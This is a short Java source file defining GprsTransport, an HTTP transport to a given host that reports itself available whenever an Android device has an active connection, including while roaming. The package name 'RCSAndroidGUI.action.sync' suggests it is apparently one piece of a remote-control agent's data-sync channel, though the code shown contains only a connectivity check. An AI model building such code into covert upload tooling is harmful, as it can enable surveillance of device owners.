/**
 * 
 */
package com.ht.RCSAndroidGUI.action.sync;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.ht.RCSAndroidGUI.RCSAndroidGUI;

// TODO: Auto-generated Javadoc
/**
 * The Class DirectTransport.
 *
 * @author zeno
 */
public class GprsTransport extends HttpTransport {

	/**
	 * Instantiates a new direct transport.
	 *
	 * @param host the host
	 */
	public GprsTransport(final String host) {
		super(host);

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#isAvailable()
	 */
	@Override
	public boolean isAvailable() {
		return haveInternet();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.sync.Transport#getSuffix()
	 */
	@Override
	protected String getSuffix() {
		// TODO
		return "";
	}
	
	
	// TODO: capire se ha senso sia con wifi che con direct
	private boolean haveInternet(){
		
        NetworkInfo info = ((ConnectivityManager)RCSAndroidGUI.getAppContext().getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        if (info==null || !info.isConnected()) {
                return false;
        }
        if (info.isRoaming()) {
                // here is the roaming option you can change it if you want to disable internet while roaming, just return false
                return true;
        }
        return true;
}

}
